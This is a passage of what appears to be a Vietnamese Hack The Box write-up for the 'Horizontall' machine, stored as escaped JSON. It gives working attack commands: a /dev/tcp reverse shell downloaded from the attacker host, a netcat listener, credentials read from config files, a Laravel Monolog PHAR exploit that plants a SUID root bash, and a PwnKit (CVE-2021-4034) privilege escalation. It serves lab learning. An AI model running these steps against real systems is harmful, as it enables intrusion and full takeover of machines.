eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQzODc3NTg2LCJleHAiOjE2NDY0Njk1ODZ9.p_uvCIHcKXwruPv8na6MVpU-aLInNKphFDvOh7zYs5U   $\u0026gt; Tuy nhiên, thử chạy một câu lệnh lại bị gặp lỗi:\n$\u0026gt; id [+] Triggering Remote code executin [*] Rember this is a blind RCE do not expect to see output {\u0026#34;statusCode\u0026#34;:400,\u0026#34;error\u0026#34;:\u0026#34;Bad Request\u0026#34;,\u0026#34;message\u0026#34;:[{\u0026#34;messages\u0026#34;:[{\u0026#34;id\u0026#34;:\u0026#34;An error occurred\u0026#34;}]}]} Ban đầu mình nghi ngờ đó là lỗi lập trình hay sao đó. Tuy vậy, nó thực sự đã gọi được về máy mình. Bởi thế, mình nhanh chóng viết tạm một mã kết nối ngược (reverse shell) như thế này:\n#!/bin/sh  sh -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.13/9000 0\u0026gt;\u0026amp;1 Và tải nó lên máy đối tượng.\n$\u0026gt; wget 10.10.16.13/rv.sh [+] Triggering Remote code executin [*] Rember this is a blind RCE do not expect to see output {\u0026#34;statusCode\u0026#34;:400,\u0026#34;error\u0026#34;:\u0026#34;Bad Request\u0026#34;,\u0026#34;message\u0026#34;:[{\u0026#34;messages\u0026#34;:[{\u0026#34;id\u0026#34;:\u0026#34;An error occurred\u0026#34;}]}]} Chúng ta có thể thấy rõ ràng nó đã được thành công chuyển đi từ máy tấn công của chúng ta:\n$ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.11.105 - - [03/Feb/2022 03:55:37] \u0026#34;GET /rv.sh HTTP/1.1\u0026#34; 200 - Và khi chúng ta chạy chương trình đó:\n$\u0026gt; bash rv.sh [+] Triggering Remote code executin [*] Rember this is a blind RCE do not expect to see output Và chúng ta nhận được một kết nối ngược:\n$ nc -lvnp 9000 listening on [any] 9000 ... connect to [10.10.16.13] from (UNKNOWN) [10.10.11.105] 43566 sh: 0: can\u0026#39;t access tty; job control turned off $ id uid=1001(strapi) gid=1001(strapi) groups=1001(strapi) III. User flag Sau khi tìm kiếm khoảng chừng là 5 giây, mình nhận ra rằng tài khoản strapi có đủ quyền hạn để đọc được flag tại /home/developer/user.txt.\n$ ls /home developer $ cd /home/developer $ ls -al total 108 drwxr-xr-x 8 developer developer 4096 Aug 2 2021 . drwxr-xr-x 3 root root 4096 May 25 2021 .. lrwxrwxrwx 1 root root 9 Aug 2 2021 .bash_history -\u0026gt; /dev/null -rw-r----- 1 developer developer 242 Jun 1 2021 .bash_logout -rw-r----- 1 developer developer 3810 Jun 1 2021 .bashrc drwx------ 3 developer developer 4096 May 26 2021 .cache -rw-rw---- 1 developer developer 58460 May 26 2021 composer-setup.php drwx------ 5 developer developer 4096 Jun 1 2021 .config drwx------ 3 developer developer 4096 May 25 2021 .gnupg drwxrwx--- 3 developer developer 4096 May 25 2021 .local drwx------ 12 developer developer 4096 May 26 2021 myproject -rw-r----- 1 developer developer 807 Apr 4 2018 .profile drwxrwx--- 2 developer developer 4096 Jun 4 2021 .ssh -r--r--r-- 1 developer developer 33 Feb 3 08:06 user.txt lrwxrwxrwx 1 root root 9 Aug 2 2021 .viminfo -\u0026gt; /dev/null Hoặc, chính xác hơn, tất cả mọi người trong máy chủ đều có thể đọc file user.txt đó. Chỉ việc cat nó ra và chúng ta có được user flag.\nIV. Leo thang quyền hạn Đúng hơn là một hướng đi sai trông-có-vẻ-rất-thật mà mình lỡ bước vào. Nếu bạn không hứng thú, bạn có thể nhảy đến mục leo thang quyền hạn thât.\nĐây là điểm bắt đầu của một thất bại đau khổ:\n$ uname -a Linux horizontall 4.15.0-154-generic #161-Ubuntu SMP Fri Jul 30 13:04:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux Và dễ thấy có rất nhiều hướng tấn công \u0026ldquo;tiềm năng\u0026rdquo; chỉ với thông tin đó.\n$ searchsploit linux kernel 4.15.0 130 ⨯ ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------  Exploit Title | Path ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ --------------------------------- Linux Kernel (Solaris 10 / \u0026lt; 5.10 138888-01) - Local Privilege Escalation | solaris/local/15962.c Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 \u0026lt; 11 / Whitebox 4 / CentOS 4) - \u0026#39;sock_sendpage()\u0026#39; Ring0 Privilege Escalation (5) | linux/local/9479.c Linux Kernel 2.6.19 \u0026lt; 5.9 - \u0026#39;Netfilter Local Privilege Escalation | linux/local/50135.c Linux Kernel 4.10 \u0026lt; 5.1.17 - \u0026#39;PTRACE_TRACEME\u0026#39; pkexec Local Privilege Escalation | linux/local/47163.c Linux Kernel 4.15.x \u0026lt; 4.19.2 - \u0026#39;map_write() CAP_SYS_ADMIN\u0026#39; Local Privilege Escalation (cron Method) | linux/local/47164.sh Linux Kernel 4.15.x \u0026lt; 4.19.2 - \u0026#39;map_write() CAP_SYS_ADMIN\u0026#39; Local Privilege Escalation (dbus Method) | linux/local/47165.sh Linux Kernel 4.15.x \u0026lt; 4.19.2 - \u0026#39;map_write() CAP_SYS_ADMIN\u0026#39; Local Privilege Escalation (ldpreload Method) | linux/local/47166.sh Linux Kernel 4.15.x \u0026lt; 4.19.2 - \u0026#39;map_write() CAP_SYS_ADMIN\u0026#39; Local Privilege Escalation (polkit Method) | linux/local/47167.sh Linux Kernel 4.8.0 UDEV \u0026lt; 232 - Local Privilege Escalation | linux/local/41886.c Linux Kernel \u0026lt; 4.15.4 - \u0026#39;show_floppy\u0026#39; KASLR Address Leak | linux/local/44325.c Linux Kernel \u0026lt; 4.16.11 - \u0026#39;ext4_read_inline_data()\u0026#39; Memory Corruption | linux/dos/44832.txt Linux Kernel \u0026lt; 4.17-rc1 - \u0026#39;AF_LLC\u0026#39; Double Free | linux/dos/44579.c ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ --------------------------------- Shellcodes: No Results Sau khi phí hoài một tiếng đồng hồ để \u0026ldquo;thử và sai\u0026rdquo; từng cái một, mình đi đến kết luận là ở đây chúng chẳng có tác dụng gì cả.\nV. Leo thang quyền hạn thật - giá như Mọi thứ quay trở về đúng quỹ đạo của nó sau khi mình bước ra khỏi con đường sai đó. Hoặc ít nhất, đó là những gì mình muốn nói, nhưng không.\nTất cả lại bắt đầu từ danh sách những cổng đang mở này:\n$ ss -lntup Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port tcp LISTEN 0 128 127.0.0.1:8000 0.0.0.0:* tcp LISTEN 0 80 127.0.0.1:3306 0.0.0.0:* tcp LISTEN 0 128 0.0.0.0:80 0.0.0.0:* tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* tcp LISTEN 0 128 127.0.0.1:1337 0.0.0.0:* users:((\u0026#34;node\u0026#34;,pid=1750,fd=31)) tcp LISTEN 0 128 [::]:80 [::]:* tcp LISTEN 0 128 [::]:22 [::]:* Theo ý mình, cổng 1337 kia trông vô cùng khả nghi. Tuy nhiên, sau một chút SSH tunneling, mình đã nhận ra rằng nó chính là điểm đầu cuối API mà chúng ta đã khám phá ra trước đó.\nMặt khác, cổng 3306 kia mới là thủ phạm thực sự.\nĐây cũng là một câu lệnh rất hữu dụng mà trong tình huống này lại mở ra một hướng đi sai lầm:\n$ grep -Rnw -e \u0026#34;password\u0026#34; environments/production/database.json:13: \u0026#34;password\u0026#34;: \u0026#34;${process.env.DATABASE_PASSWORD || \u0026#39;\u0026#39;}\u0026#34;, environments/development/database.json:12: \u0026#34;password\u0026#34;: \u0026#34;#J!:F9Zt2u\u0026#34; environments/staging/database.json:13: \u0026#34;password\u0026#34;: \u0026#34;${process.env.DATABASE_PASSWORD || \u0026#39;\u0026#39;}\u0026#34;, Không nghĩ nhiều, mình lập tức cat file development/database.json đó ra.\n{  \u0026#34;defaultConnection\u0026#34;: \u0026#34;default\u0026#34;,  \u0026#34;connections\u0026#34;: {  \u0026#34;default\u0026#34;: {  \u0026#34;connector\u0026#34;: \u0026#34;strapi-hook-bookshelf\u0026#34;,  \u0026#34;settings\u0026#34;: {  \u0026#34;client\u0026#34;: \u0026#34;mysql\u0026#34;,  \u0026#34;database\u0026#34;: \u0026#34;strapi\u0026#34;,  \u0026#34;host\u0026#34;: \u0026#34;127.0.0.1\u0026#34;,  \u0026#34;port\u0026#34;: 3306,  \u0026#34;username\u0026#34;: \u0026#34;developer\u0026#34;,  \u0026#34;password\u0026#34;: \u0026#34;#J!:F9Zt2u\u0026#34;  },  \u0026#34;options\u0026#34;: {}  }  } } Nào ai ngờ được, tất cả những thông tin trông vô cùng xác thực đó đều là những cái bẫy. Sau khi kết nối tới cơ sở dữ liệu một cách đầy hạnh phúc, tìm kiếm xung quanh một chút, cuối cùng mình tìm thấy một cái gì đó vô cùng hứa hẹn.\n$ mysql -h 127.0.0.1 -P 3306 -u developer -p strapi --password=\u0026#34;#J!:F9Zt2u\u0026#34; -e \u0026#34;SELECT * FROM strapi_administrator\u0026#34; mysql: [Warning] Using a password on the command line interface can be insecure. id username email password resetPasswordToken blocked 3 admin admin@horizontall.htb $2a$10$Z/5DNUBoQeb0hOBmD3mlous9fju9gK3FEGOVKoe.XRw4TNCTgjqu. NULL NULL Mình đã trải qua địa ngục để bẻ cái mật khẩu đó, chỉ để muộn màng nhận ra rằng nó nổi tiếng khó bẻ vì thời gian tính toán hàm băm của nó rất lâu. Dù sao thì, mình cũng đã bẻ được nó.\nadmin\tSuperStrongPassword1 Tại sao mật khẩu này trông quen thế nhỉ\u0026hellip;\nMình lập tức giác ngộ - đây chính là tài khoản admin giả mạo mà chương trình khai thác lỗi strapi của chúng ta đã tạo ra ban đầu! Công sức đổ sông đổ bể\u0026hellip; Đúng là một trải nghiệm đáng nhớ.\nVI. Thực sự leo thang đặc quyền Vẫn còn một cổng kì lạ nữa đang mở - cổng 8000. Sau một hồi chuyển hướng các cổng qua SSH:\nssh -i key/id_rsa -L 9999:127.0.0.1:8000 strapi@horizontall.htb Rồi kết nối thông qua localhost:9999, chúng ta nhìn thấy một trang Lavarel mới tinh. Bạn có để ý dòng chữ nhỏ này ở góc phải dưới không?\nLaravel v8 (PHP v7.4.18) Không mất nhiều thời gian, rất nhiều lỗ hổng đã được tìm thấy:\n$ searchsploit laravel 8 ------------------------------------------------------------------------------------- ---------------------------------  Exploit Title | Path ------------------------------------------------------------------------------------- --------------------------------- Aimeos Laravel ecommerce platform 2021.10 LTS - \u0026#39;sort\u0026#39; SQL injection | php/webapps/50538.txt Laravel - \u0026#39;Hash::make()\u0026#39; Password Truncation Security | multiple/remote/39318.txt Laravel 8.4.2 debug mode - Remote code execution | php/webapps/49424.py Laravel Nova 3.7.0 - \u0026#39;range\u0026#39; DoS | php/webapps/49198.txt PHP Laravel 8.70.1 - Cross Site Scripting (XSS) to Cross Site Request Forgery (CSRF) | php/webapps/50525.txt UniSharp Laravel File Manager 2.0.0 - Arbitrary File Read | php/webapps/48166.txt UniSharp Laravel File Manager 2.0.0-alpha7 - Arbitrary File Upload | php/webapps/46389.py ------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Hầu hết đều là chương trình Python. Chúng ta có thể chuyển hướng cổng, hoặc thực tiếp tải mã tấn công của chúng ta lên máy chủ. Tuy nhiên, biết rằng máy chủ có sẵn Python 3:\nstrapi@horizontall:~$ python3 -V Python 3.6.9 Lựa chọn sau có vẻ là một lựa chọn tốt hơn. Tuy vậy\u0026hellip;\nstrapi@horizontall:~$ python3 rt.py http://127.0.0.1:8000 /var/www/html/laravel/storage/logs/laravel.log \u0026#39;whoami\u0026#39;  Exploit... Traceback (most recent call last):  File \u0026#34;/usr/lib/python3/dist-packages/urllib3/connectionpool.py\u0026#34;, line 601, in urlopen  chunked=chunked)  File \u0026#34;/usr/lib/python3/dist-packages/urllib3/connectionpool.py\u0026#34;, line 387, in _make_request  six.raise_from(e, None)  File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 3, in raise_from  File \u0026#34;/usr/lib/python3/dist-packages/urllib3/connectionpool.py\u0026#34;, line 383, in _make_request  httplib_response = conn.getresponse()  File \u0026#34;/usr/lib/python3.6/http/client.py\u0026#34;, line 1373, in getresponse  response.begin()  File \u0026#34;/usr/lib/python3.6/http/client.py\u0026#34;, line 311, in begin  version, status, reason = self._read_status()  File \u0026#34;/usr/lib/python3.6/http/client.py\u0026#34;, line 280, in _read_status  raise RemoteDisconnected(\u0026#34;Remote end closed connection without\u0026#34; http.client.RemoteDisconnected: Remote end closed connection without response \u0026hellip; mã khai thác lại từ chối hoạt động\u0026hellip; Và bởi vậy, một lần tìm kiếm nhanh nữa đã dẫn mình tới cái repo một năm tuổi này.\nstrapi@horizontall:~$ python3 exploit.py http://127.0.0.1:8000 Monolog/RCE1 id [i] Trying to clear logs [+] Logs cleared [+] PHPGGC found. Generating payload and deploy it to the target [+] Successfully converted logs to PHAR [+] PHAR deserialized. Exploited  uid=0(root) gid=0(root) groups=0(root)  [i] Trying to clear logs [+] Logs cleared Lần này nó đã chạy một cách hoàn hảo. Tiếp theo, vào công chuyện chính, mình sao chép file /bin/bash sang một thư mục khác, thay đổi quyền sở hữu và cấp quyền SUID cho nó.\nstrapi@horizontall:~$ cp /bin/bash ~ strapi@horizontall:~$ python3 exploit.py http://127.0.0.1:8000 Monolog/RCE1 \u0026#34;chown root:root /opt/strapi/bash; chmod +s /opt/strapi/bash\u0026#34; [i] Trying to clear logs [+] Logs cleared [+] PHPGGC found. Generating payload and deploy it to the target [+] Successfully converted logs to PHAR [i] There is no output [i] Trying to clear logs [+] Logs cleared Và chỉ như vậy, giờ chúng ta có quyền truy cập root.\nstrapi@horizontall:~$ ls bash myapi strapi@horizontall:~$ ./bash -p bash-4.4# id uid=1001(strapi) gid=1001(strapi) euid=0(root) egid=0(root) groups=0(root),1001(strapi) VII. Phụ chương Vào thời điểm viết bài này (khoảng gần 5 tháng sau ngày mở thử thách), còn có một phương pháp mới lạ, an toàn và đáng tin cậy khác để lấy được quyền truy cập root thông qua CVE-2021-4034. Hẳn đây không phải chủ ý ban đầu, nhưng dù sao thì nó vẫn chạy.\nTừ trên máy tấn công của chúng ta:\nwget https://github.com/berdav/CVE-2021-4034/archive/refs/heads/main.zip -O polkit.zip Tải nó lên máy chủ, chạy make, và có root.\nstrapi@horizontall:~$ wget http://10.10.16.13/polkit.zip --2022-02-03 12:55:45-- http://10.10.16.13/polkit.zip Connecting to 10.10.16.13:80... connected. HTTP request sent, awaiting response... l200 OK Length: 6457 (6.3K) [application/zip] Saving to: ‘polkit.zip’  polkit.zip 100%[===============================================\u0026gt;] 6.31K --.-KB/s in 0.04s  2022-02-03 12:55:45 (175 KB/s) - ‘polkit.zip’ saved [6457/6457]  strapi@horizontall:~$ unzip polkit.zip Archive: polkit.zip 55d60e381ef90463ed35f47af44bf7e2fbc150d4  creating: CVE-2021-4034-main/  inflating: CVE-2021-4034-main/.gitignore  inflating: CVE-2021-4034-main/LICENSE  inflating: CVE-2021-4034-main/Makefile  inflating: CVE-2021-4034-main/README.md  inflating: CVE-2021-4034-main/cve-2021-4034.c  inflating: CVE-2021-4034-main/cve-2021-4034.sh  creating: CVE-2021-4034-main/dry-run/  inflating: CVE-2021-4034-main/dry-run/Makefile  inflating: CVE-2021-4034-main/dry-run/dry-run-cve-2021-4034.c  inflating: CVE-2021-4034-main/dry-run/pwnkit-dry-run.c  inflating: CVE-2021-4034-main/pwnkit.c strapi@horizontall:~$ cd CVE-2021-4034-main/ strapi@horizontall:~/CVE-2021-4034-main$ make cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c cc -Wall cve-2021-4034.c -o cve-2021-4034 echo \u0026#34;module UTF-8// PWNKIT// pwnkit 1\u0026#34; \u0026gt; gconv-modules mkdir -p GCONV_PATH=. cp -f /bin/true GCONV_PATH=./pwnkit.so:. strapi@horizontall:~/CVE-2021-4034-main$ ls  cve-2021-4034 cve-2021-4034.sh gconv-modules LICENSE pwnkit.c README.md  cve-2021-4034.c dry-run \u0026#39;GCONV_PATH=.\u0026#39; Makefile pwnkit.so strapi@horizontall:~/CVE-2021-4034-main$ ./cve-2021-4034 # id uid=0(root) gid=0(root) groups=0(root),1001(strapi) Vô cùng đơn giản và đáng tin cậy.\nTổng kết Và mọi thứ là vậy. Không yêu cầu kĩ thuật đặc biệt nào cả - máy này chỉ chạy phần mềm có phiên bản hơi lỗi thời một chút. Bài học rút ra được là trước khi bắt đầu đi sâu và hướng tấn công nào thì phải nghĩ kĩ, và luôn nâng cấp phần mềm lên phiên bản mới nhất mỗi khi bản vá lỗ hổng bảo mật được phát hành!\n","permalink":"https://git-akihakune.github.io/vi/blog/horizontall/","summary":"Lời giải cho Hack The Box Horizontall","title":"Hack The Box - Horizontall"}]